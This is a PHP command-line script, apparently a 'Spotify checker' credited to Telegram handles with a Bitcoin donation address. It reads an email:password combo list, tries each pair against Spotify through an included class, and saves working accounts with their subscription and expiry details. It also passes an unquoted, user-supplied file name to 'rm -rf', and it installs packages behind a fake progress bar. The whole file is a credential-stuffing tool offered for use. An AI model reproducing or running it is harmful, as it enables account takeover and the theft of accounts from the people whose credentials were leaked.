
<?php
/*
* Creado por @JorgeBarba
*/

//FIRST RUN (Install Dependencies)
if (is_file(".first")){
	$firstrun = trim(file_get_contents('.first'));
}else{
	$firstrun = true;
}
if ($firstrun == 'true'){
	echo "\033[01;32;1m[i] Primera ejecución detectada ... Instalando dependencias .....";
	echo "\n[i] ¡Esto podría tomar un tiempo!  ¡POR FAVOR NO SALIR DEL PROGRAMA! ...\n";
	sleep(1);
	echo "[#####";
	sleep(2);
	echo "##";
	sleep(1);
	echo "###";
		system('apt install curl python python2 figlet -y > /dev/null 2> /dev/null');
	for ($i=0; $i<15; $i++){
		echo "#"; 
		sleep(1);
	};
	echo "]";
	sleep(3);
	echo "\n[i] ¡Las dependencias se han instalado con éxito!";
	echo "\n[i] ¡El programa se ha instalado con éxito!";
	echo "\n[i] ¿Iniciar la configuración?";
	sleep(3);
	
	echo "\n\033[51;33;1m[i] Mostrar solo hits ??  Type \033[01;32;1m'si'\033[51;33;1m/\033[01;31m'no'\033[51;33;1m : \033[0m ";
	$conhan = fgets(fopen("php://stdin", "rb"));

	if (trim($conhan) == 'si'){
		file_put_contents('.pref', '1');	//Hitsonly
	} else {
		file_put_contents('.pref', '0');	//all
	}
	
	echo "\n[i] Por favor, reinicie el programa para ver los cambios";
	echo "\n[i] Presione ENTER para salir...";
	fgetc(STDIN);
	file_put_contents('.first','false');
	exit;
	}

echo "\033[01;32m
                    ╲ ▁▂▂▂▁ ╱
                    ▄███████▄
THE CREW           ▄██ ███ ██▄       JORGE BARBA
                  ▄███████████▄
GOKU           ▄█ ▄▄▄▄▄▄▄▄▄▄▄▄▄ █▄  CHEKER SPOTIFY
               ██ █████████████ ██
ALACRAN        ██ █████████████ ██
               ██ █████████████ ██
HAMC           ██ █████████████ ██
                  █████████████
JESUS              ███████████
                    ██     ██
                    ██     ██                                                                                    \033[0m\n";
echo"\033[01;36m==============================================================\033[0m\n";
echo "\033[01;33mversion: 1.0  \033[01;33m   @JORGEBARBA\033[0m\n";
include ('class.spotify.php');

	if(is_file('.pref')){
		$hitpref = trim(file_get_contents('.pref'));
	} else {
		$hitpref = '0';
	}
	

//Get ComboList
echo "\033[01;31;1m[i] ESCRIBA LA RUTA DEL COMBO : \033[0m";
$combohandle = fopen("php://stdin", "r");
$inpnam = trim(fgets($combohandle));
if(strpos($inpnam, ".txt") == false){
	$inpnam .= ".txt";
}
if(!is_file($inpnam)){
	echo "\n\033[05;31m[i]CANCELANDO\n[i]ARCHIVO INVALIDO ".$inpnam." O NO EXISTE!!\n[i] ¡El programa ahora saldrá! \n[i]Presione ENTER para continuar ..\033[0m";
	fgetc(STDIN);
	exit;
}
$lines = file(trim($inpnam));

/*//get ComboList Type
echo "\n \n\033[01;32;1m[i]Enter Combo List Type:\n \n[1] Email:Password\n \n[2] Username:Password\n \nResponse[1/2]:\033[0m ";
$comtype = fgets(fopen("php://stdin", "r"));
if (trim($comtype) == '2'){
	echo "\n\033[05;31m[i]ABORT.\n[i]This Feature Has Been Discontinued.\n[i]Contact \033[01;32;1m@hewhomustn0tbenamed\033[01;31m (Telegram) for Details.\n[i]The Program will Now Exit!!\n[i]Press Enter to Continue...\033[0m";
	fgetc(STDIN);
	exit;
}*/

//Saving Hits
echo "\n\033[51;33;1m[i] Ingrese el nombre del archivo para guardar los hits: : \033[0m";
$handle3 = fopen("php://stdin", "rb");
$file = trim(fgets($handle3));
if(strpos($file, ".txt") == false){
	$file .= ".txt";
}
system('rm -rf '.$file);
file_put_contents($file, "[#] Spotify Checker v".$loc_ver."\n[#] Hecho por @JorgeBarba (Telegram)\n[#] GitHub: https://github.com/VoldemortCommunity\n\n[#] Feeling Generous? Donate: 3QheChfSnPqBVBsnm1DFYg9xoHQmbnXP6d [BTC]\n\n\n");

$count = 0;
$combocount = 0;
//Starting
echo "Press Enter to Continue...";
fgetc(STDIN);
	
echo "\n\033[01;32;1m[i] Comencemos ......\n";
echo"\033[01;36m==============================================================\033[0m\n";
echo "\033[01;33mSolo saldran cuentas funcionales, espere con calma. \033[0m\n";
echo"\033[01;36m==============================================================\033[0m\n";

$spotify = new spotify();
foreach((array) $lines as $line) {
	$var = explode(':', $line);
	$usernn = trim($var[0]);
	$inppass = trim($var[1]);
	$res = $spotify->check($usernn, $inppass, 2);
	$dec = json_decode($res, true);
	if($dec["status"]==true){
		$count++;
		echo "\033[01;32;1m";
	} else {
		echo "\033[01;31m";
	}
	
	if ($dec['status'] == true){
		echo "[!] Email ID : " . $usernn . "\n"; 
		echo "[!] Contraseña : " . $inppass . "\n";
		echo "[!] Suscripción : " . $dec['subscription'] . "\n";
		echo "[!] Validez : " . $dec['expdate'] . "\n";
		echo "[!] País : " . $dec['ip'] . "\n\n\n\033[0m";
		file_put_contents($file, "[!] Email ID : ".$usernn."\n[!] Password : ".$inppass."\n[!] Subscription : " . $dec['subscription'] . "\n[!] Validity : " . $dec['expdate'] . "\n[!] Country : " . $dec['ip'] . "\n[i] SpotifyChecker by @hewhomustn0tbenamed (Telegram)!!\n\n", FILE_APPEND);
	} else if($hitpref == '0'){
		echo "[!] Email ID : " . $usernn . "\n"; 
		echo "[!] Contraseña : " . $inppass . "\n";
		echo "[!] Cuenta inválida! \n";
		echo "[!] " . $dec['error'] . "\n\n\n\033[0m";
	}
	$combocount++;
}

//End Program
echo "\n\n\n\033[01;32;1m[i] The Program has Executed Successfully!!\n[i] Combos Checked : ".$combocount."\n[i] Hits Found : ".$count."\n[i] Hits have been Saved to ".$file."\n[i] Spotify Checker by @hewhomustn0tbenamed!!\n\n      PEACE!!🖖\n ";
echo "\n\033[0m[i] Press Enter to Continue!! ";
fgetc(STDIN);
exit;
